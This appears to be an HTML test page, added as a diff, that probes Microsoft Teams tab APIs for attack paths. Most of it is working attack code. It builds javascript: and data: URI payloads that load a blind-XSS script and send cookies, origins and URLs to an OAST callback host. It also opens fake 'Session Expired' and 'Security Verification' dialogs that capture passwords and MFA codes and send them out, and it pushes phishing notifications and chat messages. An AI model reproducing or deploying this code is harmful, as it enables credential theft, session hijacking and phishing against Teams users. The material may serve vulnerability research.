@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Isolated Tests</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:8px; font-size:11px; }
+  #out { background:#161b22; padding:8px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:70vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:6px 0 4px; padding:4px; background:#21262d; border-radius:4px; }
+  .section b { color:#58a6ff; font-size:12px; }
+  button { background:#21262d; color:#c9d1d9; border:1px solid #30363d; padding:5px 10px; margin:2px; border-radius:4px; cursor:pointer; font-size:10px; }
+  button:active { background:#30363d; }
+  .g1 button { border-color:#f0883e; color:#f0883e; }
+  .g2 button { border-color:#3fb950; color:#3fb950; }
+  .g3 button { border-color:#d29922; color:#d29922; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>OPENLINK — JS executa no Teams?</b></div>
+<div class="g1">
+  <button onclick="olTest(1)">OL1: js direct</button>
+  <button onclick="olTest(2)">OL2: entity+js</button>
+  <button onclick="olTest(3)">OL3: entity+data</button>
+  <button onclick="olTest(4)">OL4: msteams://+js</button>
+  <button onclick="olTest(5)">OL5: stageview+js</button>
+</div>
+
+<div class="section"><b>CONTENT INJECTION — UI dentro do Teams</b></div>
+<div class="g2">
+  <button onclick="ciTest(1)">CI1: dialog HTTPS</button>
+  <button onclick="ciTest(2)">CI2: dialog data:</button>
+  <button onclick="ciTest(3)">CI3: notification</button>
+  <button onclick="ciTest(4)">CI4: adaptiveCard</button>
+  <button onclick="ciTest(5)">CI5: dialog phish</button>
+  <button onclick="ciTest(6)">CI6: stageView</button>
+</div>
+
+<div class="section"><b>EXTRAS</b></div>
+<div class="g3">
+  <button onclick="exTest(1)">EX1: navigateCross</button>
+  <button onclick="exTest(2)">EX2: shareDeepLink</button>
+  <button onclick="exTest(3)">EX3: openLink OAST</button>
+  <button onclick="exTest(4)">EX4: call.startCall</button>
+  <button onclick="exTest(5)">EX5: chat.openChat</button>
+  <button onclick="copyOut()">COPY</button>
+</div>
+
+<div id="out" style="margin-top:6px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var CTX = null;
+var C = 'o21c1mes8ezi4ox5wz9mmhhpikwlgcwi8.oast.site';
+var BXSS = 'xss.report/c/ztlsavior';
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+// Init
+(async function() {
+  try {
+    await microsoftTeams.app.initialize();
+    CTX = await microsoftTeams.app.getContext();
+    log('OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+  } catch(e) {
+    log('SDK init: ' + e.message, 'fail');
+  }
+})();
+
+// ================================================================
+// OPENLINK TESTS — one at a time, check OAST after each
+// The JS payload loads blind XSS + fetches OAST with document.domain
+// If OAST gets /ol-exec-N with domain != empty = JS ran in Teams
+// ================================================================
+
+function olTest(n) {
+  log('\n--- OL' + n + ' ---', 'info');
+
+  // Payload that both loads blind xss reporter AND calls OAST
+  var jsPayload = 'javascript:void((function(){' +
+    'var s=document.createElement("script");s.src="https://' + BXSS + '";document.head.appendChild(s);' +
+    'fetch("https://' + C + '/ol-exec-' + n + '?domain="+encodeURIComponent(document.domain)+"&origin="+encodeURIComponent(location.origin)+"&href="+encodeURIComponent(location.href.substring(0,200))+"&cookie="+encodeURIComponent(document.cookie.substring(0,100)))' +
+    '.catch(function(){new Image().src="https://' + C + '/ol-exec-' + n + '-img?d="+document.domain})' +
+    '})())';
+
+  var urls = {
+    1: jsPayload,
+    2: 'https://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=' + encodeURIComponent(jsPayload),
+    3: 'https://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=' +
+       encodeURIComponent('data:text/html;base64,' + btoa(
+         '<html><head><script src="https://' + BXSS + '"><\/script></head><body><script>' +
+         'fetch("https://' + C + '/ol-exec-3?domain="+encodeURIComponent(document.domain)+"&origin="+encodeURIComponent(location.origin)).catch(function(){new Image().src="https://' + C + '/ol-exec-3-img?d="+document.domain})' +
+         '<\/script></body></html>'
+       )),
+    4: 'msteams://teams.microsoft.com/l/entity/com.microsoft.teamspace.tab.web/test?webUrl=' + encodeURIComponent(jsPayload),
+    5: 'https://teams.microsoft.com/l/stage/com.microsoft.teamspace.tab.web/0?context=' +
+       encodeURIComponent('{"contentUrl":"' + jsPayload + '"}'),
+  };
+
+  var url = urls[n];
+  log('URL: ' + url.substring(0, 120) + '...', 'info');
+
+  try {
+    microsoftTeams.app.openLink(url);
+    log('openLink accepted — check OAST for /ol-exec-' + n, 'ok');
+    ex('ol-called-' + n, { status: 'accepted' });
+  } catch(e) {
+    log('openLink error: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// CONTENT INJECTION — show arbitrary UI inside Teams app
+// ================================================================
+
+function ciTest(n) {
+  log('\n--- CI' + n + ' ---', 'info');
+
+  switch(n) {
+
+    // CI1: dialog.url.open with attacker HTTPS URL
+    // This loads arbitrary content in a NATIVE Teams dialog (no URL bar)
+    case 1:
+      try {
+        microsoftTeams.dialog.url.open({
+          title: 'Company Portal',
+          url: 'https://' + C + '/ci-dialog-https?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
+          size: { height: 500, width: 400 }
+        }, function(result) {
+          log('CI1 dialog result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+        });
+        log('Dialog opened to attacker URL (check OAST)', 'ok');
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // CI2: dialog.url.open with data: URI — inline HTML in Teams dialog
+    case 2:
+      try {
+        var phishHtml = '<html><head><style>' +
+          'body{font-family:Segoe UI,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}' +
+          '.card{text-align:center;padding:30px}' +
+          '.warn{color:#d83b01;font-size:48px;margin-bottom:16px}' +
+          'h2{color:#1b1b1b;margin-bottom:8px}' +
+          'p{color:#616161;font-size:14px;margin-bottom:20px}' +
+          'input{width:100%;padding:10px;border:1px solid #8a8886;border-radius:4px;font-size:14px;margin-bottom:12px;box-sizing:border-box}' +
+          'button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer}' +
+          '</style></head><body><div class="card">' +
+          '<div class="warn">&#9888;</div>' +
+          '<h2>Session Expired</h2>' +
+          '<p>Your Microsoft 365 session has expired.<br>Please re-enter your password to continue.</p>' +
+          '<input type="password" placeholder="Password" id="pw">' +
+          '<button onclick="fetch(\'https://' + C + '/ci2-cred?pw=\'+encodeURIComponent(document.getElementById(\'pw\').value))">Sign In</button>' +
+          '</div></body></html>';
+        var dataUri = 'data:text/html;base64,' + btoa(phishHtml);
+        microsoftTeams.dialog.url.open({
+          title: 'Microsoft',
+          url: dataUri,
+          size: { height: 450, width: 380 }
+        }, function(result) {
+          log('CI2 dialog result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+        });
+        log('data: URI phishing dialog opened', 'ok');
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // CI3: notifications.showNotification — arbitrary notification inside Teams
+    case 3:
+      try {
+        if (microsoftTeams.notifications && microsoftTeams.notifications.isSupported()) {
+          microsoftTeams.notifications.showNotification({
+            message: 'Security Alert: Your account has been accessed from an unknown device. Tap here to verify your identity.',
+          });
+          log('Notification sent!', 'crit');
+          ex('ci3-notif', { sent: 'true' });
+        } else {
+          log('notifications.isSupported() = false', 'fail');
+        }
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // CI4: AdaptiveCard dialog — native Teams UI for credential capture
+    case 4:
+      try {
+        var upn = CTX ? CTX.user.userPrincipalName : 'user@company.com';
+        microsoftTeams.dialog.adaptiveCard.open({
+          title: 'Security Verification',
+          card: JSON.stringify({
+            type: 'AdaptiveCard',
+            version: '1.5',
+            body: [
+              { type: 'Image', url: 'https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31', size: 'Small' },
+              { type: 'TextBlock', text: 'Account Protection', weight: 'Bolder', size: 'Large', spacing: 'Small' },
+              { type: 'TextBlock', text: 'Unusual sign-in activity detected on your account. Please verify your identity to continue.', wrap: true, color: 'Attention', size: 'Small' },
+              { type: 'TextBlock', text: 'Email', size: 'Small', spacing: 'Large', weight: 'Bolder' },
+              { type: 'Input.Text', id: 'email', value: upn },
+              { type: 'TextBlock', text: 'Password', size: 'Small', weight: 'Bolder' },
+              { type: 'Input.Text', id: 'password', placeholder: 'Enter your password', style: 'password' },
+              { type: 'TextBlock', text: 'MFA Code (if enabled)', size: 'Small', weight: 'Bolder' },
+              { type: 'Input.Text', id: 'mfa', placeholder: '6-digit code' },
+            ],
+            actions: [{ type: 'Action.Submit', title: 'Verify Identity', style: 'positive' }]
+          })
+        }, function(result) {
+          if (result && result.result) {
+            log('CREDENTIALS CAPTURED: ' + JSON.stringify(result.result), 'crit');
+            ex('ci4-creds', {
+              email: result.result.email,
+              password: result.result.password,
+              mfa: result.result.mfa,
+              source: 'adaptiveCard-dialog'
+            });
+          } else {
+            log('CI4 result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+          }
+        });
+        log('AdaptiveCard security dialog opened', 'ok');
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // CI5: dialog.url.open with full phishing page (session expired)
+    // Points to our hosted PoC — the "session expired" page
+    case 5:
+      try {
+        // Use the existing poc-session-expired hosted page
+        var pocUrl = 'https://pedrojuniorrd.github.io/_layouts/poc-session-expired.html';
+        microsoftTeams.dialog.url.open({
+          title: 'Company Portal',
+          url: pocUrl,
+          size: { height: 600, width: 400 }
+        }, function(result) {
+          log('CI5 dialog result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+        });
+        log('Session expired phishing dialog opened', 'ok');
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // CI6: stageView.open — full-screen content injection
+    case 6:
+      try {
+        if (microsoftTeams.stageView && microsoftTeams.stageView.isSupported()) {
+          microsoftTeams.stageView.open({
+            appId: 'com.microsoft.teamspace.tab.web',
+            contentUrl: 'https://' + C + '/ci6-stageview?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
+            title: 'Important Update'
+          });
+          log('stageView opened!', 'crit');
+        } else {
+          log('stageView.isSupported() = false', 'fail');
+
+          // Try tasks.startTask as alternative (older API, same dialog behavior)
+          try {
+            microsoftTeams.tasks.startTask({
+              title: 'Company Portal',
+              url: 'https://' + C + '/ci6-task?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''),
+              height: 500,
+              width: 400
+            }, function(err, result) {
+              log('tasks.startTask result: ' + JSON.stringify(result).substring(0, 200), 'warn');
+            });
+            log('tasks.startTask opened as fallback', 'ok');
+          } catch(e2) {
+            log('tasks.startTask also failed: ' + e2.message, 'fail');
+          }
+        }
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+  }
+}
+
+// ================================================================
+// EXTRA TESTS
+// ================================================================
+
+function exTest(n) {
+  log('\n--- EX' + n + ' ---', 'info');
+
+  switch(n) {
+
+    // EX1: navigateCrossDomain to teams.microsoft.com
+    case 1:
+      try {
+        microsoftTeams.pages.navigateCrossDomain('https://teams.microsoft.com/');
+        log('navigateCrossDomain accepted', 'ok');
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // EX2: shareDeepLink with attacker URL
+    case 2:
+      try {
+        microsoftTeams.pages.shareDeepLink({
+          subPageId: 'security-update',
+          subPageLabel: 'Important Security Update',
+          subPageWebUrl: 'https://' + C + '/shared-phish'
+        });
+        log('shareDeepLink sent', 'ok');
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // EX3: openLink to plain OAST (does it open in-app or external browser?)
+    case 3:
+      try {
+        microsoftTeams.app.openLink('https://' + C + '/ex3-openlink-plain?upn=' + encodeURIComponent(CTX ? CTX.user.userPrincipalName : ''));
+        log('openLink to OAST — did it open in-app or Safari?', 'ok');
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // EX4: call.startCall — trigger call to victim
+    case 4:
+      try {
+        if (microsoftTeams.call && microsoftTeams.call.isSupported()) {
+          microsoftTeams.call.startCall({
+            targets: [CTX ? CTX.user.userPrincipalName : ''],
+            requestedModalities: [1]
+          });
+          log('Call triggered!', 'crit');
+        }
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+
+    // EX5: chat.openChat with pre-filled phishing message
+    case 5:
+      try {
+        if (microsoftTeams.chat && microsoftTeams.chat.isSupported()) {
+          microsoftTeams.chat.openChat({
+            user: CTX ? CTX.user.userPrincipalName : '',
+            message: 'Urgent: Your account requires immediate verification. Click the Company Portal tab to verify.'
+          });
+          log('Chat with phishing message opened!', 'crit');
+        }
+      } catch(e) { log('Error: ' + e.message, 'fail'); }
+      break;
+  }
+}
+</script>
+</body>
+</html>
